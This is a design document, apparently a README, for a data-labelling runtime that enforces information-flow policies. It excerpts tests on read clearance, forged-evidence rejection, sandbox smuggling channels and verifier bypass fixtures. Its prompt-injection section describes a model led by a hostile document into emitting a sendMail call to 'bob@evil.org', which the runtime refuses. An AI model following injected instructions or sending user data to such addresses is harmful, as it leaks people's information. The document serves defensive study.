# How it works

Give a value metadata that travels with it — where it came from, and what
may be done with it — and make that metadata content-addressed rather
than asserted, and three things follow. Code that derives from the value
inherits its constraints without having been written to know they exist,
so a transformation nobody audited cannot launder a restriction off.
A second machine can check what arrived instead of trusting whoever sent
it, so the constraint survives the network rather than ending at a trust
boundary. And "may this code run on my data" stops being a question about
the code's author, which is the only reason it is safe to run a program a
model wrote thirty seconds ago. Policies stop being something an
application enforces and become something the data carries.

This document is the runtime that does that. Every path below is in this
repository, every command was run to produce the output shown, and the
snippets are verbatim from the file named, reflowed to fit. Where a
mechanism is built but not yet switched on by default, it says so.

<!-- check-docs: excerpts -->

## Two readers, one table

Alice and Bob run two separate runtimes with separate identities against
one shared SQLite table in one space, and issue the same query. Ten
seconds, offline, no browser, no server:

```
cd packages/patterns
deno test -A integration/sqlite-read-clearance-multi-runtime.test.ts
```

The test first establishes that the table is genuinely shared — without
clearance, both readers see all three rows. Then, with it:

```ts
assertEquals(aliceClear.result?.map((r) => r.body), ["alice-1", "alice-2"],
  "alice must see exactly her rows");
```

Alice's withheld count is 1, Bob's is 2. And the raw stored result
document is checked, not just the reader's view
(`integration/sqlite-read-clearance-multi-runtime.test.ts`):

```ts
const bobFlat = JSON.stringify(bobRaw);
for (const leaked of ["alice-1", "alice-2"]) {
  assert(!bobFlat.includes(leaked),
    `withheld row content "${leaked}" leaked into bob's raw result doc`);
}
```

No application code decides who sees what. The rest of this document is
how that happens.

Two opt-ins are required in the pattern — `table(..., { allowReadClearance:
true })` and `db.query(..., { readClearance: true })`. Absent either, the
gate errors rather than silently applying
(`packages/runner/src/builtins/sqlite/row-label-read.ts`).

## The label is data, and the row derives its own

From `packages/patterns/cfc-row-label-records/main.tsx`, the whole rule:

```tsx
(f) => ({
  confidentiality: all(
    principal("mailto", match(f.patient_email, ADDR, { min: 1 })),
    dbOwner(),
  ),
})
```

That is an ordinary arrow function in a TypeScript file. It does not
survive compilation as code:

```
deno task cf check packages/patterns/cfc-row-label-records/main.tsx \
  --pattern-json --root packages/patterns
```

```json
"rowLabel": {
  "version": 1,
  "confidentiality": {
    "allOf": [
      { "principal": { "protocol": "mailto", "of": { "match": {
          "field": "patient_email",
          "source": "[^\\s<>,;\"]+@[^\\s<>,;\"]+", "flags": "g", "min": 1 } } } },
      { "dbOwner": true }
    ]
  }
}
```

The closure is gone, replaced by a declarative tree the storage engine
evaluates per row. A column can also carry a static label — `ssn:
{ type: "string", ifc: { confidentiality: ["pii"] } }` — and the emitted
query node carries its own declared ceiling.

## The code is constrained by what it does, not who wrote it

`packages/patterns/counter/counter.tsx` is ordinary TypeScript. Nothing
in it mentions policies, capabilities, or labels. One input is annotated
`Writable<number | Default<0>>`, and two closures use it — an `action`
that only writes, a `computed` that only reads:

```
deno task cf check packages/patterns/counter/counter.tsx --show-transformed --no-run
```

The writer's capture:

```ts
const __cfHandler_1 = __cfHelpers.handler(
  false as const satisfies __cfHelpers.JSONSchema,
  {
    type: "object",
    properties: {
      value: { type: "number", "default": 0, asCell: ["writeonly"] },
    },
    required: ["value"],
  } as const satisfies __cfHelpers.JSONSchema,
  (_, { value }) => { value.increment(-1); },
);
```

The reader's:

```ts
const __cfLift_1 = __cfHelpers.lift<
  { value: __cfHelpers.ReadonlyCell<number | Default<0>> },
  string
>(
  ({ value }) => `Counter: ${value.get()}`,
  {
    type: "object",
    properties: {
      value: { type: "number", "default": 0, asCell: ["readonly"] },
    },
    required: ["value"],
  } as const satisfies __cfHelpers.JSONSchema,
  { type: "string" } as const satisfies __cfHelpers.JSONSchema,
  { completeSchedulerScopeSummary: true },
);
```

Same cell, same annotation, two schemas differing in one token. The
author wrote neither. `readonly` and `writeonly` were computed from what
each closure body does
(`packages/ts-transformers/src/policy/capability-analysis.ts`).

Two consequences. Least privilege is derived rather than declared, so it
cannot drift from the code it describes. And the unit of capture is a
named field with a schema, so touching one confidential cell does not
contaminate everything downstream.

There is no signature check, no author allow-list, and no first-party
path. The runtime has nowhere to put the answer.

## The author cannot cheat

Capabilities and schemas are derived from types, which makes the type
system load-bearing. So the escape hatch is closed
(`packages/ts-transformers/src/transformers/cast-validation.ts`, the
first of 25 pipeline stages):

```
error: Double-casting via 'as unknown as' is not allowed.
Casts bypass reactive tracking and type safety.
```

A pattern also cannot mint the evidence its own gates require. Declaring
`InjectionSafe` on your own data gets the claim stripped at persist and
the dependent write rejected
(`packages/runner/test/cfc-integrity-mint-gate.test.ts`):

```ts
it("does not let an author-declared InjectionSafe satisfy a requiredIntegrity gate", async () => {
  const digest = tx.prepareCfc();
  expect(digest).toBe("");
  const result = await tx.commit();
  expect(result.error?.message).toContain("requiredIntegrity failed");
```

The second case repeats the proof across seven forged evidence atoms.
Twenty atom types are runtime-minted; an author-declared one survives
only when the writer's identity is a builtin
(`packages/runner/src/cfc/prepare.ts`).

The runtime does not trust its own compiler either. The classification
the transformer emitted is re-derived from the emitted bytes by a
separately written parser, and that parser has an adversarial corpus of
59 hand-built attack fixtures — ASI statement-merge desync, tokenizer
confusion, U+2028 statement merge, unicode-escaped callees, registration
hoisting (`packages/runner/test/esm-verifier-adversarial.test.ts`):

```ts
// Each fixture is a compiled-CommonJS body an attacker might hand-craft to defeat
// the verifier — the same bytes the SES compartment would evaluate. Brainstormed
// red-team style (no execution); most must be REJECTED. A few legitimate forms
// are negative controls (accept). The reject cases double as bypass detectors:
// if the verifier accepts one, that's a real gap.
```

Enforcement is also a ratchet. Any code holding a `Cell` can reach
`cell.tx`, so weakening the enforcement mode on a transaction throws
rather than succeeding
(`packages/runner/src/storage/extended-storage-transaction.ts`).

The obvious objection to all of this is that none of it is new. Flow
control has been understood for decades and has mostly stayed in
research systems, because the labels multiply and writing policies that
compose takes expertise. That cost is real and it has not gone away.
What changed is who pays it, and how often. A model will grind against
the compiler with more patience than a person has, and what it produces
is a file: once a pattern satisfies the checker it satisfies it for
everyone who runs it. The labor becomes machine time spent once rather
than expertise spent per team, which is the difference between a
technique that stays in the lab and one that ships.

## Across machines: carry the reference, not the bytes

A label is only useful if it survives leaving the machine that made it.
`packages/runner/test/cfc-cross-space-integrity.test.ts` walks the
scenarios: a cross-space link retains the source integrity plus an
endorsement, a copy of that link carries and verifies, and

```ts
it("scenario 1d — a tampered exactCopyOf (copy ≠ source) is rejected", ...)
```

Provenance is what makes that checkable. A module's identity is its
content hash, `cf:module/<hash>`, and the registry is a WeakMap populated
only during verified evaluation — so an attacker-supplied function with
byte-identical source has no entry and resolves to nothing
(`packages/runner/src/harness/verified-provenance.ts`).

The boundary is the interesting part, and the file states it plainly:

> Once a handler materializes bytes, the runtime has no basis to attest
> they are the same labeled thing, so the copy is a fresh, unendorsed
> value. This is not a bug — it is why the REFERENCE (link) is
> load-bearing for cross-space integrity: carry the link, not the
> extracted bytes.

## The exits

A pattern runs in a compartment whose globals are installed deliberately
(`packages/runner/src/sandbox/compartment-globals.ts`). The withheld list
carries a threat model per entry — `Float32Array` and `Float64Array` are
absent because a NaN's spare mantissa bits carry a payload through a
float typed-array store, which unlike `DataView.setFloat*` is not a
method and cannot be repaired. A test performs that smuggling attempt
inside a real compartment and asserts the payload does not come back
(`packages/runner/test/sandbox-global-contract.test.ts`).

Reactive egress leaves through a named sink, and the sinks are one
enumerable list (`packages/runner/src/cfc/sink-inventory.ts`):

```ts
export type InitialSinkName =
  | "fetchBinary"
  | "fetchText"
  | "fetchJson"
  | "fetchJsonUnchecked"
  | "fetchProgram"
  | "streamData"
  | "llm"
  | "llmDialog"
  | "generateText"
  | "generateObject";
```

`llm` and `generateText` are exits in exactly the sense `fetchJson` is,
which makes prompt injection a dataflow question rather than a prompting
one. `packages/runner/test/cfc-agent-prompt-injection-demo.test.ts` runs
a real runtime at the default enforcement mode through a real tool loop.
The model is given a hostile document and capitulates completely: it
emits `sendMail(recipient: "bob@evil.org")` as a literal. The runtime
refuses it:

```ts
const emails = ((await t.result.key("emails").pull()) ?? []) as SentEmail[];
expect(emails).toEqual([]);
...
expect(output.type).toBe("error-text");
expect(output.value).toContain("Tool call denied");
expect(output.value).toContain("requires integrity");
```

The legitimate path succeeds by passing the recipient as a reference to a
cell whose integrity was written under builtin identity, not as a string
the model chose. The claim is not that the model resists injection — the
model is the attacker's to choose, and here it does exactly what the
attacker asked. The claim is that the routing field is refused anyway,
and the refusal returns to the model as a tool error rather than being
silently swallowed.

That test drives a recorded model fixture rather than a live endpoint,
and it isolates the integrity axis; confidentiality is out of its scope.

What that closes is narrower than "injection is solved" and more useful
than a prompt that asks the model to be careful. The attack has to cross
a boundary the runtime checks — a field declared to require integrity
the model's output does not carry — and at that boundary the check reads
where the value came from, not what it says. An attack that stays inside
what a pattern is already permitted to do is not addressed by any of
this. What is gone is the dependence on the model's judgment.

That generalizes because injection was never really about models.
Software today asks you to trust the author of everything you run, which
makes the trusted computing base the entire program; injection is what a
trusted base that large looks like once the thing inside it can be
talked to. The runtime's answer is the same one it gives everywhere
else: check the flow, not the author. A pattern is untrusted whether its
hostile input arrived in a document, a tool result, or a model's own
output.

## What runs this

Every pattern in the repository is compiled, transformed and
SES-verified on every pull request — 413 authored entry files across four
CI shards (`deno task cfcheck`). A second gate replays each pattern
against 112 recorded contract baselines, because the updater performs no
structural check before swapping a pattern onto a running piece. Pattern
tests run at `enforce-explicit`, the same mode the servers run, rather
than in an observe mode that would let violations pass.

## What is not here yet

The enforcement mode defaults to `enforce-explicit`, which rejects a
commit carrying a recorded boundary reason
(`packages/runner/src/runtime.ts`, pinned for both server hosts in
`runtime-presets.ts`). A grep will also find
`DEFAULT_CFC_ENFORCEMENT_MODE = "disabled"` in `cfc/types.ts`; that is
the transaction-level default, not the runtime's.

Three defaults compose into one honest statement, so here it is in one
place: the default sink ceiling map is empty, a sink absent from the map
is ungated, and `cfcFlowLabels` — the propagation shown above — defaults
to `off`. Today the label machinery is exercised by tests and by the
patterns that opt in; it is not yet gating egress in a default
deployment. The ceiling stays empty until the default label transition
closes value-copy laundering, because a ceiling now would gate the few
correctly-labeled flows and miss the rest.

The render ceiling resolves a label but does not enforce; enforcement
lives in the reconciler behind `cfcRenderCeiling`, a browser toggle that
is off by default and dogfood-only. With it off, a pattern's own
declassification of its render boundary is honored. Separately, the
protection this runtime offers at the render boundary is the label and
contract layer, not DOM sanitization: `cf-markdown` carries an open
sanitization gap.

The imperative `fetch` a handler can call is settled on a one-second grid
derived from the issue instant, so it is closed as a clock, but it is not
label-gated, and shipped patterns use it today. Bringing it under the
same ceiling machinery as the reactive sinks is unfinished.

`enforce-strict`, which additionally rejects flow-derived paths, is not
on. `docs/development/EXPERIMENTAL_OPTIONS.md` lists every dial with its
current value and intended end state.

The shape of the remaining work is visible in the test suite rather than
only in a roadmap. Unimplemented annotations are pinned to fail closed
rather than left to behave arbitrarily:

```ts
it("scenario 3a [GAP] — the passThrough ifc annotation fails closed (unimplemented)", ...)
```

The trusted base is also larger than the microkernel it should shrink to
— `packages/runner/src/cfc/` is forty files.

Attestation — what would let a machine prove which runtime it is running
before your data arrives — is specified rather than built here.
`docs/specs/verifiable-execution/` carries the commit model, receipts,
the append-only log and its authorization rules, and the trust profiles
a verifier uses to say how much of a claim it will take on evidence. The
hardware pipeline lives outside this repository.

That spec describes a larger shape than this document covers: receipts
that leave the fabric as claims other systems can check, and, further
out, a way to price the uncertainty that remains instead of pretending it
can be eliminated. Neither is in the runtime today. Both are written
down.

The mechanism is built and the semantics hold. What remains is turning
the dials on without wedging the patterns already running on them.

[Why](./why.md) is the argument in prose;
[the overview](./inverting-the-physics-of-trust.md) is the long form.
